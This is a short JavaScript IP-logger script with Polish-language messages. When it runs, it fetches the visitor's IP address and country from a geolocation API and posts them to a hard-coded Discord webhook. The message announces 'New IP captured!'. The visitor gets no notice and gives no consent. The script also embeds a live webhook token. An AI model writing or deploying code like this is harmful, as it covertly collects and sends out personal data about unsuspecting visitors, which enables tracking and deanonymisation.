var webHookUrl = "https://discord.com/api/webhooks/1014114651585400912/jHmMImYT1kCfu6mqRMMGB-bO-cXzSyLknubyIsnCElEN7M8l9X-zcXgnKFrfdnln8g3l";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "Logi IP",
        avatar_url: "",
        content:    "**Zdobyto nowe IP!** \n" + 
		    "__**:globe_with_meridians: Adres IP:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Kraj:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
